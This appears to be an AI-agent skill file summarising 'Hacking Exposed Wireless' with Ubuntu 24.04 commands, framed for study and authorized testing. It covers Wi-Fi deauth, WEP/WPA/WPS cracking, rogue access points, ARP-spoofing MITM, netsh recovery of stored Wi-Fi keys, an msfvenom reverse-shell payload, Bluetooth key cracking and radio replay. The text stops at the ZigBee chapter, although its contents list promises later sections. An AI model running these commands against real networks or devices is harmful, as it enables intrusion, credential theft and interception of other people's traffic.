---
name: hacking-exposed-wireless-ubuntu24
description: Full-book summary and Ubuntu 24.04 command reference for "Hacking Exposed Wireless" (3rd Ed., Joshua Wright & Johnny Cache) — Wi-Fi/802.11, Bluetooth Classic & LE, SDR, GSM/LTE cellular, ZigBee, and Z-Wave attack techniques with modernized tooling.
---

# Hacking Exposed Wireless (3rd Edition) — Complete Book Summary & Ubuntu 24.04 Wireless Security Skills Guide

> **Source:** *Hacking Exposed Wireless: Wireless Security Secrets & Solutions*, 3rd Edition, by Joshua Wright and Johnny Cache (McGraw-Hill/Osborne, 2015). 14 chapters across 3 parts, 499 book pages.
>
> **What this file is:** A condensed, chapter-by-chapter technical summary of every attack technique in the book, paired with the modern Ubuntu 24.04 LTS (Noble Numbat) command or tool that replaces each 2014-era tool the authors used. Where a book tool is dead, deprecated, or superseded, that is called out explicitly rather than silently repeated.

### ⚠️ Legal & Ethical Use

This document is a **study and authorized-testing reference only**. Every tool, command, and technique below must be used **only** against networks, devices, and radios you own or have **explicit written authorization** to test. A few extra notes specific to *wireless*:

- **RF is not like Ethernet.** Transmitting (deauth frames, WPS brute-forcing, Bluetooth injection, SDR replay, and especially anything that transmits on cellular/GSM frequencies) can affect devices and networks outside your control, and in most countries operating a transmitter on licensed spectrum (cellular bands) without a license is a serious offense regardless of "research" intent. Chapter 12 (cellular) is summarized here at a **conceptual level only** — no IMSI-catcher/rogue-BTS build steps are reproduced, because standing up a working base station is both a radio-license violation almost everywhere and a direct-harm risk to third-party phones nearby.
- Unauthorized access to a computer or network is illegal under the U.S. Computer Fraud and Abuse Act, the UK Computer Misuse Act, and equivalent laws elsewhere, whether the access is over Wi-Fi, Bluetooth, or any other radio.
- Several techniques here (WEP, classic WPS PIN brute force, Bluetooth "Just Works"/legacy pairing, GSM A5/1) target protocols that are now rare or end-of-life. They are kept for conceptual/historical value and because closely related weaknesses (weak PSKs, WPS still shipped on consumer routers, BLE "Just Works" pairing) remain current.

### How to Use This Guide

- **Document Overview** explains which chapters and parts this reference distills.
- **Parts 1–3** follow the book's three parts (802.11, Bluetooth, "More Ubiquitous Wireless"), each broken into one subsection per chapter, with **Book Command → Ubuntu 24.04 Equivalent** pairs inline.
- The closing **Quick-Reference Master Command Matrix** maps every tool in the book to its Ubuntu 24.04 install path and modern equivalent.
- **Appendix: Glossary** defines every acronym/term used throughout.

---

## Table of Contents

- [Document Overview](#document-overview)
- [Prerequisite: Preparing Your Ubuntu 24.04 LTS Environment](#prerequisite-preparing-your-ubuntu-2404-lts-environment)

**[PART I: Hacking 802.11 Wireless Technology](#part-i-hacking-80211-wireless-technology)**
- [1.1 Introduction to 802.11 Hacking (Ch. 1)](#11-introduction-to-80211-hacking-chapter-1)
- [1.2 Scanning and Enumerating 802.11 Networks (Ch. 2)](#12-scanning-and-enumerating-80211-networks-chapter-2)
- [1.3 Attacking 802.11 Wireless Networks — Defeating WEP (Ch. 3)](#13-attacking-80211-wireless-networks--defeating-wep-chapter-3)
- [1.4 Attacking WPA-Protected 802.11 Networks (Ch. 4)](#14-attacking-wpa-protected-80211-networks-chapter-4)
- [1.5 Attacking 802.11 Wireless Clients (Ch. 5)](#15-attacking-80211-wireless-clients-chapter-5)
- [1.6 Bridging the Air-Gap from Windows 8 (Ch. 6)](#16-bridging-the-air-gap-from-windows-8-chapter-6)

**[PART II: Bluetooth](#part-ii-bluetooth)**
- [2.1 Bluetooth Classic Scanning and Reconnaissance (Ch. 7)](#21-bluetooth-classic-scanning-and-reconnaissance-chapter-7)
- [2.2 Bluetooth Low Energy Scanning and Reconnaissance (Ch. 8)](#22-bluetooth-low-energy-scanning-and-reconnaissance-chapter-8)
- [2.3 Bluetooth Eavesdropping (Ch. 9)](#23-bluetooth-eavesdropping-chapter-9)
- [2.4 Attacking and Exploiting Bluetooth (Ch. 10)](#24-attacking-and-exploiting-bluetooth-chapter-10)

**[PART III: More Ubiquitous Wireless](#part-iii-more-ubiquitous-wireless)**
- [3.1 Software-Defined Radios (Ch. 11)](#31-software-defined-radios-chapter-11)
- [3.2 Hacking Cellular Networks (Ch. 12)](#32-hacking-cellular-networks-chapter-12-conceptual-overview)
- [3.3 Hacking ZigBee (Ch. 13)](#33-hacking-zigbee-chapter-13)
- [3.4 Hacking Z-Wave Smart Homes (Ch. 14)](#34-hacking-z-wave-smart-homes-chapter-14)

**[Quick-Reference Master Command Matrix](#quick-reference-master-command-matrix-for-ubuntu-2404)**
**[Appendix: Glossary of Key Terms](#appendix-glossary-of-key-terms)**

---

## Document Overview

The book is organized into three parts:

1. **Part I — Hacking 802.11 Wireless Technology** (Ch. 1–6): 802.11 fundamentals, discovery/scanning, WEP cracking, WPA/WPA2-Personal and -Enterprise attacks, client-side attacks, and a post-exploitation chapter on pivoting from a compromised Windows 8 host to attack nearby wireless networks.
2. **Part II — Bluetooth** (Ch. 7–10): Bluetooth Classic and Bluetooth Low Energy (BLE) scanning, eavesdropping, and active attacks (PIN cracking, identity spoofing, profile abuse, iBeacon).
3. **Part III — More Ubiquitous Wireless** (Ch. 11–14): software-defined radio (SDR) fundamentals, cellular (GSM/LTE) security, ZigBee (IEEE 802.15.4), and Z-Wave smart-home protocols.

Every chapter follows the same arc: protocol/security primer → reconnaissance → active attack → (where applicable) defensive countermeasures. This guide follows that same arc per chapter, but keeps the prose tight and puts the weight on **working, current commands**.

---

## Prerequisite: Preparing Your Ubuntu 24.04 LTS Environment

The book (2015) targets Kali/BackTrack-era tool versions, 32-bit drivers, Python 2, and `mon0`-style interface naming. On **Ubuntu 24.04 LTS**, install the modern baseline below once:

```bash
# Core Wi-Fi attack suite
sudo apt update && sudo apt install -y \
  aircrack-ng wifite reaver hashcat hcxtools hcxdumptool \
  hostapd wpasupplicant mdk4 \
  wireshark tshark tcpdump nmap netcat-openbsd \
  dsniff ettercap-text-only bettercap macchanger \
  kismet kismet-plugins \
  build-essential git cmake python3-pip python3-venv

# Bluetooth Classic + BLE
sudo apt install -y bluez bluez-tools bluez-hcidump python3-bluez \
  ubertooth libbtbb-utils bettercap
pip3 install --user bleak   # modern Python3 BLE library (replaces gatttool scripting)

# Software-defined radio
sudo apt install -y gqrx-sdr rtl-sdr hackrf gnuradio gr-osmosdr \
  multimon-ng sox dump1090-mutability

# ZigBee / Z-Wave hardware tooling (python3, built from source — see 3.3/3.4)
sudo apt install -y python3-usb python3-crypto python3-serial python3-setuptools
```

> **Key Ubuntu 24.04 differences to keep in mind, used throughout this guide:**
> - **Monitor-mode interface naming:** the book's `mon0` is obsolete. Modern `airmon-ng start wlan0` keeps the original name and appends `mon` (e.g. `wlan0mon`). Always run `sudo airmon-ng check kill` first to stop `NetworkManager`/`wpa_supplicant` from fighting over the adapter.
> - **Deprecated BlueZ CLI tools:** `hcitool`, `hciconfig`, `hcidump`, `sdptool`, `gatttool`, `rfcomm`, `l2ping` are all marked deprecated upstream (replaced by `bluetoothctl`/`btmgmt`) but Ubuntu still ships them (via `bluez`/`bluez-hcidump`, built with `--enable-deprecated`) for exactly this kind of legacy tooling. They work today but may disappear in a future release — this guide shows both the legacy and the `bluetoothctl`/`btmgmt` equivalent.
> - **WPA/WPA2 cracking has moved to hash mode 22000.** `cudaHashcat`/`oclHashcat` (book) and legacy modes `-m 2500`/`-m 16800` are gone — modern unified `hashcat` uses `-m 22000`, fed by `hcxdumptool` → `hcxpcapngtool` instead of `airodump-ng` + manual `.cap`→`.hccap` conversion.
> - **Pyrit is unmaintained** (Python 2, last updated ~2016). Its ESSID-precompute idea is obsolete now that GPU hashcat cracks `-m 22000` directly at speed; it is not part of the Ubuntu 24.04 workflow below.
> - **wifite in Ubuntu 24.04 is "wifite2"** (`derv82/wifite2`, Python 3) — same name, rewritten internals, same CLI spirit as the book's wifite.
> - **KillerBee (ZigBee) and rfcat/KillerZee (Z-Wave)** are not packaged for Ubuntu — they're still `git clone` + `python3 setup.py install`, same as the book, just Python 3 now instead of Python 2 (confirmed current upstream: `github.com/riverloopsec/killerbee`, `github.com/atlas0fd00m/rfcat`, `github.com/joswr1ght/killerzee`).

---

## PART I: Hacking 802.11 Wireless Technology

### 1.1 Introduction to 802.11 Hacking (Chapter 1)

This chapter is conceptual: 802.11 frame types (management/control/data), MAC addressing in the four-address 802.11 header, the original security primer (WEP → WPA → WPA2, pre-shared key vs. Enterprise/802.1X), and a hardware/driver survey (chipsets, `mac80211` vs. vendor out-of-tree drivers, external antennas, GPS for wardriving).

**Ubuntu 24.04 notes:**
- Chipset support is now almost entirely upstream in the Linux kernel's `mac80211` stack; check monitor-mode + packet-injection support with:
  ```bash
  iw list | grep -A 8 "Supported interface modes"
  sudo airmon-ng   # lists adapters and chipset/driver
  ```
- Preferred chipsets for injection in 2026 remain Atheros (`ath9k_htc`), Ralink/MediaTek (`rt2800usb`), and RTL8812AU-based adapters (out-of-tree `aircrack-ng/rtl8812au` driver, still required — not upstream).
- GPS for wardriving: `gpsd` + `gpsd-clients` (`sudo apt install gpsd gpsd-clients`), feeding coordinates into Kismet exactly as the book's external GPS workflow does.

### 1.2 Scanning and Enumerating 802.11 Networks (Chapter 2)

The book walks OS-specific discovery/sniffing tools: Windows (Vistumbler, NetMon with NDIS 6.0 monitor mode, AirPcap, CommView for WiFi), OS X (KisMAC), and Linux (`airodump-ng`, Kismet), closing with PPI (Per-Packet Information) metadata for signal-strength visualization and triangulation.

On Ubuntu 24.04 the Linux-native path is the only one that matters day to day:

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0          # -> wlan0mon
sudo airodump-ng wlan0mon           # passive scan: APs, clients, channels, encryption
sudo airodump-ng --band abg wlan0mon   # include 5/6 GHz if adapter supports it

# Kismet (richer: client correlation, GPS, alerting, plugin ecosystem)
sudo kismet -c wlan0
```

- **Book Command → Ubuntu 24.04:** `airodump-ng --channel 1 --bssid <BSSID> -w capture mon0` → `sudo airodump-ng --channel 1 --bssid <BSSID> -w capture wlan0mon` (same flags, new interface name).
- PPI visualization: Kismet still emits PPI-tagged pcap (`--source=...` with GPS attached); `kismet_logtools`/`kismetdb_to_pcap` replace the book's standalone PPI post-processing scripts.

### 1.3 Attacking 802.11 Wireless Networks — Defeating WEP (Chapter 3)

Covers "security through obscurity" (hidden SSID, MAC filtering — both trivially defeated) before the core subject: **WEP key-recovery attacks**. WEP is rare in the field today but the techniques below are the conceptual ancestors of every modern Wi-Fi attack, and the exact same `aircrack-ng` suite still implements them unchanged.

**Hidden SSID / MAC filtering bypass**
```bash
# Hidden SSID: wait for a legit client to (re)associate, or force one off to capture its probe
sudo aireplay-ng --deauth 1 -a <BSSID> -c <client_MAC> wlan0mon

# MAC filtering bypass: spoof an already-associated client's MAC
sudo ifconfig wlan0 down
sudo macchanger -m <allowed_client_MAC> wlan0   # macchanger replaces the book's manual ifconfig hw ether
sudo ifconfig wlan0 up
```

**WEP key-recovery attacks** (all via the `aircrack-ng` suite, unchanged tool names):

| Technique | Book / Ubuntu 24.04 command | Purpose |
|---|---|---|
| Passive capture | `sudo airodump-ng --channel <ch> --bssid <BSSID> --write wep-capture wlan0mon` | Collect IVs for statistical (FMS/PTW) key recovery |
| ARP-replay (traffic generation) | `sudo aireplay-ng --arpreplay -h <spoofed_client_MAC> -b <BSSID> wlan0mon` | Force the AP to re-encrypt and resend captured ARP packets, rapidly inflating IV count |
| Fake authentication | `sudo aireplay-ng --fakeauth 1 -o 1 -e <ESSID> -b <BSSID> -h <spoofed_MAC> wlan0mon` | Associate without the WEP key so injected frames are accepted |
| Fragmentation attack | `sudo aireplay-ng --fragment -e <ESSID> -b <BSSID> -h <spoofed_MAC> wlan0mon` | Recover PRGA (keystream) from one captured packet without needing an ARP packet |
| Chopchop attack | `sudo aireplay-ng --chopchop -e <ESSID> -b <BSSID> -h <spoofed_MAC> wlan0mon` | Decrypt a captured packet byte-by-byte by abusing the lack of integrity protection |
| Forge a packet from recovered PRGA | `packetforge-ng --arp -a <BSSID> -h <spoofed_MAC> -k <dst_IP> -l <src_IP> -y <xor_file> -w forged.cap` | Build an injectable ARP packet from the keystream recovered above |
| Replay the forged packet | `sudo aireplay-ng --interactive -F -r forged.cap wlan0mon` | Feed the forged ARP back in to keep generating fresh IVs |
| Crack the key | `aircrack-ng wep-capture-01.cap` | Runs PTW/FMS/KoreK statistical attacks once enough (usually 20k–80k) IVs are captured |

These flag names and the overall PTW/FMS workflow are **identical today** — this is one part of the book that needed zero modernization beyond the interface name.

**Putting it together automatically:**
```bash
sudo wifite --wep   # or no flag at all: wifite auto-detects WEP vs WPA targets and chains the above steps
```
*(Book → Ubuntu 24.04: the book's `wifite.py` on a Jasager/WiFi Pineapple → today's `wifite` package is "wifite2," a Python 3 rewrite with the same end-to-end automation philosophy; `sudo apt install wifite` on Ubuntu 24.04.)*

### 1.4 Attacking WPA-Protected 802.11 Networks (Chapter 4)

**WPA/WPA2-Personal (PSK) — capturing and cracking:**

The book's `airodump-ng` + deauth-to-force-reconnect + `aircrack-ng`/`cudaHashcat`/pyrit workflow is replaced on Ubuntu 24.04 by the `hcxdumptool`/`hcxpcapngtool`/`hashcat -m 22000` pipeline, which is faster and — critically — can capture a crackable **PMKID** from the AP alone, with **no client and no deauth needed**:

```bash
# Modern (preferred): PMKID + handshake capture, no deauth required
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to the unified hash format
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Crack: dictionary, then mask/brute-force
hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt
hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d   # e.g. all-numeric default PSKs
```

If you need the book's classic deauth-forced-handshake approach (e.g., the adapter can't do PMKID capture), it still works unchanged:
```bash
sudo airodump-ng --channel <ch> --bssid <BSSID> -w handshake wlan0mon
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon   # force a client to reauthenticate
aircrack-ng -w wordlist.txt handshake-01.cap      # classic aircrack-ng dictionary attack still works
```

| Book tool | Ubuntu 24.04 status / equivalent |
|---|---|
| `cudaHashcat`/`oclHashcat -m 2500` | Unified `hashcat -m 22000` (modes 2500/16800 are deprecated) |
| `pyrit batch` / `pyrit attack_db` | Unmaintained; not used — GPU `hashcat -m 22000` is faster without precompute |
| `wash -i mon0 -C` (WPS scan) | `sudo wash -i wlan0mon --ignore-fcs` |
| `reaver -i mon0 -b <BSSID> -S -v` (WPS PIN brute force) | `sudo reaver -i wlan0mon -b <BSSID> -vv` still works against routers that don't lock out after failed attempts; prefer a **Pixie Dust** attack (`reaver -i wlan0mon -b <BSSID> -K 1 -vv` or the dedicated `OneShot`/`bully -b <BSSID> --pixiewps -v 3 wlan0mon`) which recovers the WPS PIN offline in seconds against vulnerable (mostly older) chipsets, instead of the book's online brute force |

**WPA-Enterprise (802.1X/EAP) attacks:**

The book walks EAP-MD5, EAP-GTC, LEAP, EAP-FAST, EAP-TLS, and PEAP/EAP-TTLS, all via a **rogue AP running a malicious RADIUS server** that downgrades or captures the EAP handshake:

```bash
# hostapd-wpe: rogue AP that harvests EAP creds / captures challenge-response
git clone https://github.com/aircrack-ng/hostapd-wpe.git   # now maintained under aircrack-ng (book used OpenSecurityResearch's original fork)
# build against a matching hostapd source tree per the project's README, then:
sudo ./hostapd-wpe ./hostapd-wpe.conf -s
```
- **LEAP** credentials recovered this way are cracked offline with `asleap` (still build-from-source, `github.com/joswr1ght/asleap`): `genkeys -r dict.txt -f dict.hashed -n dict.idx` then `asleap -r capture.cap -f dict.hashed -n dict.idx`.
- **EAP-MD5** challenge/response is crackable offline with `eapmd5pass` (source tool, same as the book) — rare in the field today.
- **EAP-TLS / PEAP / EAP-TTLS**: hostapd-wpe still demonstrates certificate-validation failures on misconfigured supplicants (client not checking the server cert) exactly as the book describes; the fix is the same too — enforce CA validation and server-identity checking on every client.

Modernization note: LEAP and EAP-MD5 are now rare outside legacy enterprise gear; PEAP/EAP-TTLS with proper certificate pinning remain the realistic target, and the attack is still "get the client to associate to your rogue AP because it isn't validating the RADIUS server's certificate."

### 1.5 Attacking 802.11 Wireless Clients (Chapter 5)

This chapter flips the target from AP to **client**, covering: Metasploit `browser_autopwn` as an automated exploit server, standing up a malicious "I-love-my-neighbors" open AP (karma-adjacent — honeypot AP + NAT + transparent proxy) to pull clients in, attacking already-associated clients via ARP spoofing + traffic manipulation, and direct 802.11 client-injection techniques.

**Exploit server (Metasploit):**
```bash
sudo msfconsole
# use auxiliary/server/browser_autopwn2   (module name updated from the book's browser_autopwn)
```

**Rogue/honeypot AP serving traffic to lured clients:**
```bash
# Create the AP
sudo apt install hostapd dnsmasq
sudo hostapd ./open-ap.conf          # same config-file driven workflow as the book
sudo ifconfig wlan0 10.0.1.1 netmask 255.255.255.0
sudo dnsmasq -C ./dhcp_pwn.conf -d   # modern dnsmasq replaces the book's isc-dhcp-server for DHCP+DNS in one tool
```

**Attacking already-connected clients — ARP spoofing + MITM:**
```bash
sudo apt install dsniff ettercap-text-only
sudo arpspoof -i wlan0 -t <victim_IP> <gateway_IP>         # same syntax as the book
sudo arpspoof -i wlan0 -t <victim_IP> -r <gateway_IP>       # bidirectional

# ettercap filter-driven MITM (same workflow as the book)
etterfilter ./filter.etter -o filter.ef
sudo ettercap -T -i wlan0 -F filter.ef -M arp /<victim_IP>/ /<gateway_IP>/
```
*Modern alternative:* `bettercap -iface wlan0` → `set arp.spoof.targets <victim_IP>; arp.spoof on; net.sniff on` consolidates ARP spoofing, DNS spoofing, and HTTP(S) proxying (the book's ettercap filters + separate sslstrip) into one actively maintained tool. `sslstrip` itself is Python 2 and unmaintained; **bettercap's `https.proxy`/`hstshijack`** is the current equivalent for HTTPS-downgrade style client attacks, and is far less reliable against modern HSTS-preloaded sites than it was in 2015 — note this as a real-world limitation, not a tooling gap.

**Karma-style "jump on any probed SSID" rogue AP:**
```bash
sudo ./hostapd-wpe -k ./hostapd-karma.conf   # book's exact tool
```
*Modern note:* classic Karma relies on clients broadcasting a Preferred Network List (PNL) in probe requests. iOS, Android, and Windows have shipped randomized MACs and suppressed directed probe requests for years, which meaningfully weakens this attack today versus 2015 — the maintained successor is **`hostapd-mana`** (`sensepost/hostapd-mana`), which adds "loud MANA" (answer all probes) and known-beacon modes to compensate.

**Soft-AP tap-interface MITM + post-exploit recon:**
```bash
sudo airtun-ng -a <BSSID> -t 0 wlan0mon          # same flag set today
sudo ifconfig at0 <attacker_IP> netmask 255.255.255.0
sudo nmap -T5 -A <victim_IP>                      # unchanged
```

### 1.6 Bridging the Air-Gap from Windows 8 (Chapter 6)

A post-exploitation chapter: once Meterpreter has a shell on a Windows 8 host, use **native Windows commands inside that shell** to enumerate and later hijack the host's known Wi-Fi networks — "bridging the air-gap" from a wired/compromised host back onto wireless. These Windows-side commands are unchanged on Windows 10/11 today; the Ubuntu-side equivalent is simply the attacker's Metasploit Framework used to get the shell in the first place.

```
C:\> netsh wlan show interfaces          REM adapter, driver, signal, current SSID
C:\> netsh wlan show drivers             REM monitor-mode/promiscuous capability
C:\> netsh wlan show profiles            REM every SSID this host has ever joined
C:\> netsh wlan show profile name=<SSID> key=clear   REM recover the stored PSK in cleartext
C:\> netsh wlan show networks mode=bssid REM currently visible APs

REM Turn the compromised host into a rogue AP to pull in other local devices:
C:\> netsh wlan set hostednetwork mode=allow ssid=<name> key=<psk>
C:\> netsh wlan start hostednetwork

REM Exfiltrate a profile (incl. PSK) and replay it onto another host you control:
C:\attacker> netsh wlan export profile name="<SSID>"
C:\> netsh wlan add profile filename="C:\TEMP\<SSID>.xml"
C:\> netsh interface set interface "Wi-Fi" disable
C:\> netsh interface set interface "Wi-Fi" enable
C:\> netsh wlan connect name="<SSID>"
```
- Remote monitor-mode capture from the Meterpreter session uses Microsoft Network Monitor (`NetMon`)/Message Analyzer's command-line capture in NDIS 6.0 monitor mode, exactly as the book describes — there is no Linux-side substitute here because the capture has to happen *on the compromised Windows box*.
- **Attacker-side (Ubuntu 24.04):** generate the payload and catch the session with current Metasploit Framework (`sudo apt install metasploit-framework` or the official installer script, since Ubuntu's repo version lags upstream), e.g. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<you> LPORT=4444 -f exe > payload.exe` and `use exploit/multi/handler` to catch it — the rest of the chapter runs from inside the resulting shell exactly as shown above.

---

## PART II: Bluetooth

### 2.1 Bluetooth Classic Scanning and Reconnaissance (Chapter 7)

Covers Bluetooth Classic fundamentals (inquiry/paging, LMP, SDP, profiles, legacy pairing/encryption), then active, passive, and hybrid device discovery, plus passive traffic analysis using an Ubertooth.

**Active discovery (book tools are deprecated but still present on Ubuntu 24.04 via `bluez`/`bluez-hcidump`):**
```bash
# Legacy (still works, deprecated upstream)
sudo hcitool scan --all --flush
sudo hcitool name <BD_ADDR>

# Modern replacement
bluetoothctl
[bluetoothctl]# scan on
[bluetoothctl]# devices
[bluetoothctl]# info <BD_ADDR>
```

**Passive discovery / sniffing with Ubertooth** (`sudo apt install ubertooth` — Ubuntu 24.04 packages it directly, skipping the book's manual `libbtbb` + `ubertooth` source build unless you need bleeding-edge firmware):
```bash
ubertooth-util -v                 # verify firmware version
sudo airmon-ng start wlan0 1      # 802.11 monitor mode, used alongside BT recon to correlate co-located Wi-Fi/BT radios (book's technique)
```

**Service enumeration:**
```bash
sudo apt install btscanner        # if not in the default repo, build from the Kali source package
sdptool browse <BD_ADDR>          # deprecated but present; modern: `bluetoothctl info <BD_ADDR>` lists UUIDs/services too
```

### 2.2 Bluetooth Low Energy Scanning and Reconnaissance (Chapter 8)

BLE fundamentals (GAP/GATT, advertising vs. connected mode, frame layout, security modes), then scanning and GATT service/characteristic enumeration.

```bash
# Legacy (deprecated, still present)
sudo hcitool lescan
sudo gatttool -b <BD_ADDR> --primary
sudo gatttool -b <BD_ADDR> --characteristics
sudo gatttool -b <BD_ADDR> --char-read --uuid=0x2a00    # e.g. Device Name characteristic

# Modern replacement: bluetoothctl's built-in GATT menu
bluetoothctl
[bluetoothctl]# scan on
[bluetoothctl]# connect <BD_ADDR>
[bluetoothctl]# menu gatt
[bluetoothctl]# list-attributes <BD_ADDR>
[bluetoothctl]# select-attribute <attribute_path>
[bluetoothctl]# read

# Modern scriptable equivalent (replaces ad-hoc gatttool shell scripting): Python 3 + bleak
python3 - <<'PY'
import asyncio
from bleak import BleakScanner, BleakClient

async def main():
    devices = await BleakScanner.discover()
    for d in devices:
        print(d.address, d.name)

asyncio.run(main())
PY
```
*Book → Ubuntu 24.04:* every `gatttool --char-read --uuid=0xXXXX` in the book maps 1:1 to a `bleak` `client.read_gatt_char(0xXXXX)` call — same GATT model, just a maintained, cross-platform Python 3 API instead of a deprecated CLI shelling-out pattern.

### 2.3 Bluetooth Eavesdropping (Chapter 9)

Open-source Bluetooth Classic and BLE sniffing (Ubertooth), commercial sniffer overview, and BLE connection-following / promiscuous-mode following.

```bash
# BLE advertising/follow-mode capture to a pcap Wireshark can read directly
ubertooth-btle -f -c btle-capture.pcap       # follow a connection
ubertooth-btle -p                             # promiscuous mode: auto-detect and follow any new connection
wireshark btle-capture.pcap &                 # or: tshark -r btle-capture.pcap -Y "btatt.handle == 0x0011"

# Classic Bluetooth: Ubertooth's BTBB tools (python/pcaptools in libbtbb) remain the practical open-source option
# since no Classic-sniffing path was ever upstreamed into apt; build libbtbb from source as in the Prerequisite section.
```
Commercial sniffers (Ellisys, Frontline/Teledyne) referenced in the book are unchanged proprietary hardware — no Ubuntu packaging angle applies.

### 2.4 Attacking and Exploiting Bluetooth (Chapter 10)

PIN/pairing attacks (Classic and BLE), device-identity manipulation (BD_ADDR and class-of-device spoofing), profile abuse (PAN, OBEX file transfer), and Apple iBeacon spoofing.

**Classic PIN cracking** (passive capture of the pairing exchange with Ubertooth, then offline crack):
```bash
git clone https://github.com/mikeryan/btcrack.git && cd btcrack && make
./btcrack <num_bits> <BD_ADDR_1> <BD_ADDR_2> <IN_RAND> ...   # same syntax as the book; no apt package exists
```

**BLE pairing/PIN cracking and LTK decryption (`crackle`, still source-build-only):**
```bash
git clone https://github.com/mikeryan/crackle.git && cd crackle && make && sudo make install
crackle -i capture.pcap                       # recover the Temporary Key (legacy "Just Works"/passkey pairing)
crackle -i capture.pcap -o decrypted.pcap      # then decrypt the full session with the recovered LTK
```
*Note:* this attack only works against **Legacy Pairing** (BLE 4.0/4.1, no LE Secure Connections). Modern BLE 4.2+/5.x devices using LE Secure Connections (ECDH-based) are not vulnerable to this specific key-recovery technique — call this out when the chapter's attack doesn't reproduce on current hardware.

**Device-identity spoofing:**
```bash
# BD_ADDR spoofing (works on BD_ADDR-writable chipsets, mostly older CSR-based dongles)
wget -q http://www.willhackforsushi.com/code/bdaddr.c
gcc -o bdaddr -lbluetooth bdaddr.c && sudo mv bdaddr /usr/local/bin
sudo bdaddr -i hci0 <new_BD_ADDR>
sudo bccmd -d hci0 coldreset                   # CSR-specific chip reset to apply it

# Class-of-device spoofing (legacy, still present)
sudo hciconfig hci0 up class 0xf00704 piscan name "NotReallyAWatch"
# Modern: btmgmt class <major> <minor>
```

**Profile abuse — unauthorized PAN access / OBEX file transfer attacks:**
```bash
sudo modprobe bnep
sdptool browse <BD_ADDR>            # confirm PAN/OBEX service UUIDs are exposed
obexftp -b <BD_ADDR> -l              # list files over OBEX (unauthenticated push/pull misconfig)
obexftp -b <BD_ADDR> -g <filename>   # pull a file
```

**iBeacon spoofing:** iBeacon is just a specific BLE advertising payload (Apple's UUID/Major/Minor format in the manufacturer-data AD structure). Spoofing it is advertisement forging, doable today with `bettercap`'s `ble` module or a short `bleak`/`bluepy`-style raw-advertising script instead of the book's lower-level HCI commands — the attack (clone or forge an iBeacon to trigger a victim app's geofence logic) is unchanged.

---

## PART III: More Ubiquitous Wireless

### 3.1 Software-Defined Radios (Chapter 11)

SDR architecture (ADC → DSP → baseband), hardware choice (RTL-SDR as the cheap entry point, HackRF as the versatile transmit-capable option), a DSP crash course, and two hands-on case studies: decoding POCSAG pager traffic, and a "blind" fixed-code remote (e.g. garage door) capture-and-replay attack.

**Setup (apt-packaged on Ubuntu 24.04 — no PPA or source build needed, unlike the book's 2014 install steps):**
```bash
sudo apt install gqrx-sdr rtl-sdr hackrf gnuradio gr-osmosdr multimon-ng sox
rtl_test          # verify an RTL-SDR dongle enumerates correctly
hackrf_info       # verify a HackRF
```

**Spectrum scanning:**
```bash
gqrx &            # GUI waterfall/spectrum analyzer, same as the book
```

**ADS-B aircraft tracking (book's worked example of "receive-only" SDR use):**
```bash
git clone https://github.com/antirez/dump1090.git && cd dump1090 && make
./dump1090 --interactive --net
# Ubuntu 24.04 alternative, apt-installable: sudo apt install dump1090-mutability
```

**POCSAG pager decoding:**
```bash
rtl_fm -f 929.6625M -s 22050 - | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha /dev/stdin
# multimon-ng is directly apt-installable now; the book had to build it from source.
```

**Fixed-code remote replay attack (e.g., garage door, gate remote):**
```bash
hackrf_transfer -r capture.cfile -f <carrier_freq> -s 2000000   # capture the remote's transmission
hackrf_transfer -t capture.cfile -f <carrier_freq> -s 2000000   # replay it verbatim
```
This "blind replay" still works today against **fixed-code** remotes (no rolling code) — the same class of cheap garage/gate openers the book targeted. Any rolling-code remote (most modern vehicle key fobs, modern garage openers) defeats a pure replay by design; the book is explicit about this limitation and it still holds.

### 3.2 Hacking Cellular Networks (Chapter 12, conceptual overview)

This chapter covers 2G/GSM architecture, authentication (A3/A8, SIM-based challenge-response), encryption (A5/0, A5/1, A5/2, A5/3), passive GSM eavesdropping, A5/1 key recovery via precomputed (Kraken) rainbow tables, IMSI-catcher/rogue-BTS concepts, femtocell attacks, and a 4G/LTE security overview (mutual authentication via AKA, stronger encryption, the removal of the null-cipher option in most networks).

**This guide deliberately does not reproduce operational commands for standing up a rogue GSM base station or an IMSI catcher.** Two independent reasons, both already flagged in the Legal & Ethical Use notice: (1) transmitting on licensed cellular spectrum without a license is illegal in virtually every jurisdiction regardless of intent, and (2) an active rogue BTS affects every phone in range, not just an authorized test target, so it fails the "test only what you're authorized to test" bar structurally. What's safe and genuinely useful to know:

- The tool lineage the book references for **passive, receive-only** GSM analysis (airprobe + GNU Radio to demodulate a captured GSM burst) has a maintained successor: **`gr-gsm`** (Piotr Krysik), which absorbed and replaced the unmaintained Airprobe project. `kalibrate-rtl`/`kalibrate-hackrf` (frequency-offset calibration against a GSM base station's control channel) are still the standard first step, still source-build-only (`github.com/steve-m/kalibrate-rtl`).
- A5/1's rainbow-table attack (the book's "Kraken") is now a largely historical/academic reference: the public rainbow tables are old, most live networks have moved off A5/1 where regulators pushed them to, and generating/hosting the tables is itself a multi-terabyte undertaking that isn't a realistic weekend project — it's documented here as a concept, not a runnable recipe.
- LTE/4G (and 5G) use mutual network/device authentication (EPS-AKA / 5G-AKA) and no longer offer a null-encryption downgrade path on compliant networks, closing the book's simplest 2G attack class; residual LTE research today is mostly about protocol-implementation bugs and IMSI-catching via downgrade-to-2G/3G where it's still permitted by the device, not about breaking the 4G crypto directly.
- If you need to legally and safely study cellular protocols hands-on, do it against **your own private LTE/5G core** (e.g., `srsRAN` + a USRP/LimeSDR in a shielded enclosure or a wired RF setup, on your own SIMs) rather than against commercial spectrum — that's the current standard practice this chapter's ideas map onto.

### 3.3 Hacking ZigBee (Chapter 13)

ZigBee/IEEE 802.15.4 fundamentals (PHY/MAC layers, NWK/APS layers, profiles), the ZigBee security model (network key, link key, AES-CCM*), and the **KillerBee** attack framework: active/passive discovery, eavesdropping, replay, encryption attacks (recovering the over-the-air network key), packet forging, and a full attack walkthrough including physical key extraction from a captured device's RAM.

